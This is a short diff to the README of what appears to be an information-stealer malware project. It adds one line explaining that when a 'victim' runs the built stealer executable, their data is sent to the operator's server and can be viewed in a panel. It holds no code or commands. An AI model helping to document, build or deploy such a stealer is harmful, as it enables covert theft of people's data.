@@ -34,4 +34,6 @@ $ python start.ru
 # Build stealer
 ![image](https://user-images.githubusercontent.com/101527966/174895155-0c0b570e-a655-4492-8811-04b87e5730b4.png)
 
+When victim start the stealer-build.exe or __main__.py in /client data will send on your server. After this you can check data in home in panel.
+
 ![image](https://user-images.githubusercontent.com/101527966/174898453-5c372ecd-4d84-43ce-9067-61536accc944.png)
